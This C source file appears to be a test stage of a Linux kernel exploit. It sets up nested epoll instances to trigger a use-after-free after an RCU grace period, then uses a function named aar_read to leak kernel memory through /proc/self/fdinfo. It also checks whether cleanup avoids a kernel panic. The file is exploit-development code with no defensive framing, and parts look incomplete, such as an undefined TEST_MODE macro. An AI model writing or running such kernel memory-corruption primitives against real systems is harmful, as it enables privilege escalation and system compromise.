#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <string.h>

uint64_t aar_read(int epA_fd) {
    char path[256], buf[4096];
    snprintf(path, sizeof(path), "/proc/self/fdinfo/%d", epA_fd);
    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    int n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n > 0) {
        buf[n] = 0;
        if (strstr(buf, "ino:2f72657070617773")) {
            return 0x2f72657070617773;
        }
    }
    return 0;
}

int main(int argc, char **argv) {
    char mode = TEST_MODE;
    printf("[*] Starting M4 Cleanup Test (Mode %c)\n", mode);
    fflush(stdout);

    int ep_race_waiter = epoll_create1(0); // epA
    int ep_race_target = epoll_create1(0); // epB

    struct epoll_event ev = { .events = EPOLLIN, .data.fd = ep_race_target };
    epoll_ctl(ep_race_waiter, EPOLL_CTL_ADD, ep_race_target, &ev);

    printf("[*] epA=%d, epB=%d. Triggering race by closing epB...\n", ep_race_waiter, ep_race_target);
    fflush(stdout);
    
    close(ep_race_target); // triggers __fput
    
    printf("[*] RACE TRIGGERED. Waiting for RCU grace period...\n");
    fflush(stdout);
    sleep(2); // Wait for call_rcu to free the file to SLUB and poison it
    
    printf("[*] RCU grace period finished. Reading fdinfo...\n");
    fflush(stdout);

    uint64_t val = aar_read(ep_race_waiter);
    if (val != 0x2f72657070617773) {
        printf("[-] fdinfo read failed or returned wrong value (%lx).\n", val);
    } else {
        printf("[+] fdinfo read success (read swapper/).\n");
    }
    fflush(stdout);

    if (mode == 'B') {
        printf("[+] Mode B: Testing safe cleanup. Calling close(epA)...\n");
        fflush(stdout);
        close(ep_race_waiter); // __ep_remove runs
        printf("[+] SUCCESS: No panic! Cleanup survived.\n");
        fflush(stdout);
    } else {
        printf("[+] Mode A: Testing control. Calling close(epA) (EXPECT PANIC)...\n");
        fflush(stdout);
        close(ep_race_waiter);
        printf("[-] FAILED: Should have paniced!\n");
        fflush(stdout);
    }

    return 0;
}
